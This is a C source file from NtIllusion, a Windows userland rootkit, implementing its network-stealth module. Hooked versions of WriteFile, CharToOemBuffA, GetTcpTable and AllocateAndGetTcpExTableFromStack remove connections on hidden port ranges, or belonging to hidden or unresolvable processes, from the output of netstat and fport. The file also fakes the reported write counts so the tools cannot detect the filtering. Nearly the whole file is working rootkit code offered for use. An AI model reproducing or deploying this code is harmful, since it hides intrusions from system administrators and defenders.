/******************************************************************************
  kNTINetHide.c	: Network stealth
  *****************************************************************************
  Author		: Kdm (Kodmaker@syshell.org)
  WebSite		: http://www.syshell.org

  Copyright (C) 2003,2004 Kdm
  *****************************************************************************
  This file is part of NtIllusion.

  NtIllusion is free software; you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation; either version 2 of the License, or
  (at your option) any later version.

  NtIllusion is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with NtIllusion; if not, write to the Free Software
  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
  ******************************************************************************/

#include <winsock2.h>				// for socket hijack
#include <tlhelp32.h>				// Tool help 32 functions
#include <windows.h>
#include "kNTINetHide.h"
#include "../../Misc/kNTIConfig.h"
#include "../../Misc/kNTILib.h"

FARPROC fAllocateAndGetTcpExTableFromStack;
FARPROC fGetTcpTable;
FARPROC fCharToOemBuffA;
FARPROC fDeviceIoControl;
FARPROC fWriteFile;
extern FARPROC fGetProcAddress;	// import genuine GetProcAddress

void ShowError()
{
LPVOID lpMsgBuf;
FormatMessage( 
    FORMAT_MESSAGE_ALLOCATE_BUFFER | 
    FORMAT_MESSAGE_FROM_SYSTEM | 
    FORMAT_MESSAGE_IGNORE_INSERTS,
    NULL,
    GetLastError(),
    MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language
    (LPTSTR) &lpMsgBuf,
    0,
    NULL 
);
// Process any inserts in lpMsgBuf.
// ...
// Display the string.
//OutputString( "Error: %s (%d)\n", (LPCTSTR)lpMsgBuf, GetLastError());
OutputString( "Error: %s\n", (LPCTSTR)lpMsgBuf);
// Free the buffer.
LocalFree( lpMsgBuf );

}

// Convert FPORT.exe's output mode from char by char to line by line to allow hidding
// of lines containing ports to hide
BOOL WINAPI MyWriteFile(
  HANDLE hFile,                    // handle to file to write to
  LPCVOID lpBuffer,                // pointer to data to write to file
  DWORD nNumberOfBytesToWrite,     // number of bytes to write
  LPDWORD lpNumberOfBytesWritten,  // pointer to number of bytes written
  LPOVERLAPPED lpOverlapped        // pointer to structure for overlapped I/O
  ){
	BOOL bret=TRUE;
	static DWORD total_len=0;
	static char PreviousChars[2048*10];	// bof? ;p
	char* chr = (char*)lpBuffer;

	// Get real address using GetProcAddress because the function may not have been hijacked at IAT
	// level but using GetProcAddress()
	if(!fWriteFile) {
		fWriteFile = (FARPROC) fGetProcAddress(GetModuleHandle("kernel32.dll"),"WriteFile");
		if(!fWriteFile) return 0;
	}

	PreviousChars[total_len++] = chr[0]; // add new char
	if(chr[0] == '\r') 
	{

		PreviousChars[total_len] = '\n';
		PreviousChars[++total_len] = '\0';
		// show this line only if it contains no hidden port / process prefix
		if(strstr((char*)PreviousChars,(char*)RTK_PORT_HIDE_STR)==NULL	// hidden port ?
		&& strstr((char*)PreviousChars,(char*)RTK_PROCESS_CHAR)==NULL)  // hidden process ?
		{
			bret = fWriteFile(hFile, (void*)PreviousChars, strlen((char*)PreviousChars), lpNumberOfBytesWritten, lpOverlapped);
		}
		else
		{
			OutputString("[!] NTIllusion made a port hidden (%s* range)\n", (int)RTK_PORT_HIDE_STR);
		}
		
		memset(PreviousChars, 0, 2048);
		total_len= 0;
	}
	(*lpNumberOfBytesWritten) = nNumberOfBytesToWrite; // fake var, so fport can't see output wasn't done
	return bret;
}


// Used by fport to directly get tcp/udp information
// cf http://www.rootkit.com/board.php?thread=1120&did=edge103&disp=1120
// We won't hijack here as dwIoControlCode and data structures are subject to change
BOOL WINAPI MyDeviceIoControl(HANDLE hDevice, DWORD dwIoControlCode, LPVOID lpInBuffer,
  DWORD nInBufferSize, LPVOID lpOutBuffer, DWORD nOutBufferSize, LPDWORD lpBytesReturned,
  LPOVERLAPPED lpOverlapped )
{
	//OutputString("[!] MyDeviceIoControl(dwIoControlCode==%x)\n", dwIoControlCode);
	// Get real address using GetProcAddress because the function may not have been hijacked at IAT
	// level but using GetProcAddress()
	if(!fDeviceIoControl) {
		fDeviceIoControl = (FARPROC) fGetProcAddress(GetModuleHandle("kernel32.dll"),"DeviceIoControl");
		if(!fDeviceIoControl) return 0;
	}
	
	return (*fDeviceIoControl)(hDevice, dwIoControlCode, lpInBuffer, nInBufferSize, 
		lpOutBuffer, nOutBufferSize, lpBytesReturned, lpOverlapped);
}


//		MyCharToOemBuffA : replace the function used by nestat to convert strings to a different
//		charset before it sends it to output, so we can get rid of some awkward lines...  :)
BOOL WINAPI MyCharToOemBuff(LPCTSTR lpszSrc, LPSTR lpszDst, DWORD cchDstLength)
{
	// Get real address using GetProcAddress because the function may not have been hijacked at IAT
	// level but using GetProcAddress()
	if(!fCharToOemBuffA) {
		fCharToOemBuffA = (FARPROC) fGetProcAddress(GetModuleHandle("user32.dll"),"CharToOemBuffA");
		if(!fCharToOemBuffA) return 0;
	}

	// If the line contains our range of port, we simply get rid of it.
	if(strstr(lpszSrc,(char*)RTK_PORT_HIDE_STR)!=NULL)
	{
		if(VERBOSE_STEALTH) {
			OutputString("[!] NTIllusion made a port hidden (%s* range)\n", (int)RTK_PORT_HIDE_STR);
		}
		return (*fCharToOemBuffA)("", lpszDst, cchDstLength); 
	}
	return (*fCharToOemBuffA)(lpszSrc, lpszDst, cchDstLength);
}



// Returns 1 if Row must be hidden according to parameters passed
// if( IsHidden( htons((u_short)portX), htons((u_short)portY) ) ) ...
int IsHidden(u_long LocalPort, u_long RemotePort) 
{
	int hidethis=0;

	if(	((LocalPort >=RTK_PORT_HIDE_MIN) &&   (LocalPort<=RTK_PORT_HIDE_MAX))	// local port is in hidden range ?
	||  ((RemotePort>=RTK_PORT_HIDE_MIN) &&   (RemotePort <= RTK_PORT_HIDE_MAX))// remote port is in hidden range ?
	||  (LocalPort *10) == RTK_PORT_HIDE_MIN									// is RTK_PORT_HIDE_STR?			
	||  (RemotePort*10) == RTK_PORT_HIDE_MIN									// is RTK_PORT_HIDE_STR?
	)	
		hidethis=1;
	
	return hidethis;
}

DWORD WINAPI MyGetTcpTable(PMIB_TCPTABLE_ pTcpTable, PDWORD pdwSize, BOOL bOrder)
{
	FARPROC fhtons;
	HINSTANCE hLib;
	HINSTANCE hDll;
	u_long LocalPort=0, RemotePort=0;
	DWORD dwRetVal=0, numRows=0;
	FARPROC fGetTcpTable;
	int i,j;


	// Resolve fGetTcpTable
	hLib = LoadLibrary("iphlpapi.dll");
	if(!hLib)
		OutputString("!hlib\n");

	fGetTcpTable = (FARPROC) fGetProcAddress(hLib, "GetTcpTable");
	if(!fGetTcpTable)
		OutputString("!fGetTcpTable\n");

	
	// Resolve htons
	hDll = LoadLibrary("wsock32.dll");
	if(!hDll)
	{
		OutputString("[!]	!hDll\n");
		return 0;
	}
	
	fhtons = (FARPROC) fGetProcAddress(hDll, "htons");
	if(!fhtons)
	{
		OutputString("[!] CANNOT FIND ADDRESS FOR : htons() \n");
		return 0;
	}


	// Call function, if no error, strip unwanted MIB_TCPROWs
	if ((dwRetVal = (*fGetTcpTable)(pTcpTable, pdwSize, bOrder)) == NO_ERROR) 
	{

		// for each row, test if it must be stripped
		for (i=0; i<(int)pTcpTable->dwNumEntries; i++) 
		{

			LocalPort	= (u_short) fhtons((u_short)(pTcpTable)->table[i].dwLocalPort);
			RemotePort	= (u_short) fhtons((u_short)(pTcpTable)->table[i].dwRemotePort);
			OutputString("#	GetTcpTable %d<=>%d\n", LocalPort, RemotePort);

			// If row must be filtered
			if( IsHidden(LocalPort, RemotePort) )
			{
				OutputString("filtering port %d\n", LocalPort);
				
				for(j=i; j<((int)pTcpTable->dwNumEntries - 1); j++)
					memcpy( &(pTcpTable->table[i]), &(pTcpTable->table[i+1]), sizeof(MIB_TCPROW_));
				memset( &(pTcpTable->table[j]), 0x00, sizeof(MIB_TCPROW_));
				
				(*pdwSize)-= sizeof(MIB_TCPROW_);
				(pTcpTable->dwNumEntries)--;
				// o o o o
				// 0 1 2 3

			}	  
		}
	}

	return dwRetVal;
}


//		AllocateAndGetTcpExTableFromStack : Universal TCP ports state review hook.
//		This will hide all connections whose :
//		- local port is in hidden range
//		- remote port is in hidden range
//		- process name starts by RTK_FILE_CHAR
//		- process name is unknow
//		Dued to crosschecks between hijacked functions, any unknown process must be
//		considered as a hidden process.

// Netstat :
// MyAllocateAndGetTcpExTableFromStack only used when flag -o (process associated with
// open port) is triggered.

// consulter les sources de netstatk
DWORD WINAPI MyAllocateAndGetTcpExTableFromStack( 
  PMIB_TCPEXTABLEEx *pTcpTable,	// buffer for the connection table
  BOOL bOrder,					// sort the table?
  HANDLE heap,
  DWORD zero,
  DWORD flags)
{
	FARPROC fhtons;
	HINSTANCE hDll, hDll2;
	DWORD err=0, i=0, j=0; // error handler, TcpTable walk index, TcpTable sort index
	char psname[512];	   // process name
	u_long LocalPort=0, RemotePort=0;

	
	OutputString("[!!]	AllocateAndGetTcpExTableFromStack \n");
	hDll = LoadLibrary("wsock32.dll");
	if(!hDll)
	{
		OutputString("[!]	!hDll\n");
		return 0;
	}
	
	fhtons = (FARPROC) fGetProcAddress(hDll, "htons");
	if(!fhtons)
	{
		OutputString("[!] CANNOT FIND ADDRESS FOR : htons() \n");
		return 0;
	}
	OutputString("[!!]	2\n");
	// Get real address using GetProcAddress because the function may not have been hijacked at IAT
	// level but using GetProcAddress()

	hDll2 = LoadLibrary( "iphlpapi.dll");
	if(!hDll2)
	{
		OutputString("[!]	!hDll2\n");
		return 0;
	}
	if(!fAllocateAndGetTcpExTableFromStack) 
	{
		fAllocateAndGetTcpExTableFromStack = (FARPROC) fGetProcAddress( hDll2, 
				"AllocateAndGetTcpExTableFromStack" );
		if(!fAllocateAndGetTcpExTableFromStack)
		{
			OutputString("[!!]	Can't resolve AllocateAndGetTcpExTableFromStack (GetProcAddress)\n");
			return 0;
		}
	}

	OutputString("[!!]	3\n");

	// Call genuine function ...
	err = fAllocateAndGetTcpExTableFromStack(pTcpTable, bOrder, heap, zero, flags);
	if(err)
	{
		ShowError();
		//(*pTcpTable) = 0x00;
		//FreeHeap(heap, );
/*
		while(1)
		{
			Sleep(1000);
			OutputString("loop() \n");
		}
*/
		// in the case of an error, return it
		// permet de survivre, meme si on perdle contact, on filtre toujours
		// appels entrelacés ??
		return err;	
	}

	OutputString("[!!]	AllocateAndGetTcpExTableFromStack : checking ports\n");
	//sprintf(tmp, "'%d'\n", ((*pTcpTable)->dwNumEntries));
	//OutputString("[%d]\n", tmp);
	//OutputString("[%d]\n", pTcpTable);
	//((*pTcpTable)->dwNumEntries)

	// ... and start to filter unwanted rows. This will hide all opened/listening/connected/closed/... sockets
	// for each process...
	for(i = 0; i < ((*pTcpTable)->dwNumEntries); j=i) 
	{
		OutputString("#	AllocateAndGetTcpExTableFromStack loop i=%d\n", i);
		//memset(psname, 0, 512);

		GetProcessNamebyPid((*pTcpTable)->table[i].dwProcessId, (char*)psname);
		LocalPort	= (u_short) fhtons((u_short)(*pTcpTable)->table[i].dwLocalPort);
		RemotePort	= (u_short) fhtons((u_short)(*pTcpTable)->table[i].dwRemotePort);
		OutputString("#	AllocateAndGetTcpExTableFromStack %s %d<=>%d\n", (char*)psname, LocalPort, RemotePort);

		if( !_strnicmp((char*)psname, RTK_FILE_CHAR, strlen(RTK_FILE_CHAR))	// RTK_FILE_CHAR prefix : hidden process ?
			|| !_strnicmp((char*)psname, NTILLUSION_PROCESS_NOTFOUND, strlen(NTILLUSION_PROCESS_NOTFOUND))	// process not found ?
			|| (( LocalPort	>= RTK_PORT_HIDE_MIN) && ( LocalPort <= RTK_PORT_HIDE_MAX))		//local port is in hidden range ?
			|| ((RemotePort	>= RTK_PORT_HIDE_MIN) && (RemotePort <= RTK_PORT_HIDE_MAX)) )	//remote port is in hidden range ?
		{
			//if(VERBOSE_STEALTH) 
			OutputString("[!] hidden :\n");
			OutputString("[!] NTIllusion made a TCP socket hidden for process %s (%d)\n", (char*)psname, (*pTcpTable)->table[i].dwProcessId);
			// we move all rows left one position lower in TcpTable array (8=>7, 7=>6, 6=>5 ...)
			// this leads to the wipe of the row that contains a "hidden process"
			for(j=i; j<((*pTcpTable)->dwNumEntries); j++){
				memcpy( (&((*pTcpTable)->table[j])), (&((*pTcpTable)->table[j+1])),sizeof(MIB_TCPEXROWEx));
			}
			// clear last row
			memset( (&((*pTcpTable)->table[(((*pTcpTable)->dwNumEntries)-1)])), 0, sizeof(MIB_TCPEXROWEx));
			((*pTcpTable)->dwNumEntries)-=1;  // decrease number of rows by one
			// do the job again for the current row, that may also contain a hidden process
			continue;
		}

	  // this row was ok, jump to the next
		i++;

	}
	// We may free the x skipped & unused TCP rows (x=(GenuineNumberOfRows-((*pTcpTable)->dwNumEntries)))
	// that begin at TcpTable index number ((*pTcpTable)->dwNumEntries)-1)
  return err;
}

/*
DWORD WINAPI MyAllocateAndGetTcpExTableFromStack( 
  PMIB_TCPEXTABLE *pTcpTable,  // buffer for the connection table
  BOOL bOrder,               // sort the table?
  HANDLE heap,
  DWORD zero,
  DWORD flags)
{

	FARPROC fhtons;
	HINSTANCE hDll, hDll2;
	DWORD err=0, i=0, j=0; // error handler, TcpTable walk index, TcpTable sort index
	char psname[512];	   // process name
	char tmp[512];
	u_long LocalPort=0, RemotePort=0;

	
	OutputString("[!!]	AllocateAndGetTcpExTableFromStack \n");
	hDll = LoadLibrary("wsock32.dll");
	if(!hDll)
	{
		OutputString("[!]	!hDll\n");
		return 0;
	}
	
	fhtons = (FARPROC) GetProcAddress(hDll, "htons");
	if(!fhtons)
	{
		OutputString("[!] CANNOT FIND ADDRESS FOR : htons() \n");
		return 0;
	}
	OutputString("[!!]	2\n");
	// Get real address using GetProcAddress because the function may not have been hijacked at IAT
	// level but using GetProcAddress()

	hDll2 = LoadLibrary( "iphlpapi.dll");
	if(!hDll2)
	{
		OutputString("[!]	!hDll2\n");
		return 0;
	}
	if(!fAllocateAndGetTcpExTableFromStack) 
	{
		fAllocateAndGetTcpExTableFromStack = (FARPROC) GetProcAddress( hDll2, 
				"AllocateAndGetTcpExTableFromStack" );
		if(!fAllocateAndGetTcpExTableFromStack)
		{
			OutputString("[!!]	Can't resolve AllocateAndGetTcpExTableFromStack (GetProcAddress)\n");
			return 0;
		}
	}

	OutputString("[!!]	3\n");


	// Call genuine function ...
	err = fAllocateAndGetTcpExTableFromStack(pTcpTable, bOrder, heap, zero, flags);
	OutputString("[!!] 4\n");
	if(err)
	{
		OutputString("[ERROR] exiting (fAllocateAndGetTcpExTableFromStack() returned an error)\n");
		return err;	// on the case of an error, return it
	}
	
	OutputString("[!!] 5 (err=%d, lasterror=%d)\n", err, GetLastError());

	// ... and start to filter unwanted rows. This will hide all opened/listening/connected/closed/... sockets
	// for every process whose name is starting by RTK_PROCESS_CHAR
	for(i = 0; i < (*pTcpTable)->dwNumEntries; j=i) {
		OutputString("[!!] i=%d\n", i);
		memset(psname, 0, 512);

		GetProcessNamebyPid((*pTcpTable)->table[i].dwProcessId, (char*)psname);

		if(( strstr((char*)psname, "_nti")!=0)) 
		{
			// we move all rows left one position lower in TcpTable array (8=>7, 7=>6, 6=>5 ...)
			// this leads to the wipe of the row that contains a "hidden process"
			for(j=i; j<((*pTcpTable)->dwNumEntries); j++){
				memcpy( (&((*pTcpTable)->table[j])), (&((*pTcpTable)->table[j+1])),sizeof(MIB_TCPEXROW));
			}
			// clear last row
			memset( (&((*pTcpTable)->table[(((*pTcpTable)->dwNumEntries)-1)])), 0, sizeof(MIB_TCPEXROW));
			((*pTcpTable)->dwNumEntries)-=1;  // decrease number of rows by one
			// do the job again for the current row, that may also contain a hidden process
			continue;
		}
		// this row was ok, jump to the next
		i++;
	}
	// We may free the x skipped & unused TCP rows (x=(GenuineNumberOfRows-((*pTcpTable)->dwNumEntries)))
	// that begin at TcpTable index number ((*pTcpTable)->dwNumEntries)-1)
  return err;
}
*/

// GetProcessNamebyPid: kInject remixed
// There is a problem when a process tries to get the real name of "hidden" process 
// by using its PID and the Toolhelp32 functions. This is probably caused by the fact
// that theses functions rely on a hijacked version of NtQuerySystemInformation. (Theses 
// functions doesn't use GetProcAddress to retrieve its real address)
// So any unknown process must be considered as a hidden process.
int GetProcessNamebyPid(DWORD pId, char* name)
{
    HINSTANCE   hLib;
    PROCESSENTRY32 PEntry;
    HANDLE hTool32;
    //Functions pointers :
    FARPROC fCreateToolhelp32Snapshot;
    FARPROC fProcess32First;
    FARPROC fProcess32Next;

	strcpy(name, (char*)NTILLUSION_PROCESS_NOTFOUND);
    hLib = LoadLibrary("Kernel32.DLL");
    
    //Functions addresses :
    fCreateToolhelp32Snapshot = (FARPROC) GetProcAddress( hLib,"CreateToolhelp32Snapshot");
    fProcess32First = (FARPROC) GetProcAddress( hLib, "Process32First" );
    fProcess32Next = (FARPROC) GetProcAddress( hLib, "Process32Next" );
    
    PEntry.dwSize = sizeof(PROCESSENTRY32);     //Set Size of structure before use
    hTool32 = (HANDLE)fCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0); //Create SnapShot
    
    fProcess32First(hTool32, &PEntry);    //Get first process
    if(PEntry.th32ProcessID == pId){
		strcpy(name, PEntry.szExeFile);
		return 1;
	}

    while( fProcess32Next(hTool32,&PEntry) )
	{
		if(PEntry.th32ProcessID == pId){
			strcpy(name, PEntry.szExeFile);
			return 1;
		}
	}
    if(PEntry.th32ProcessID == pId){
		strcpy(name, PEntry.szExeFile);
		return 1;
	}
    FreeLibrary(hLib);
    
    return 0;
}
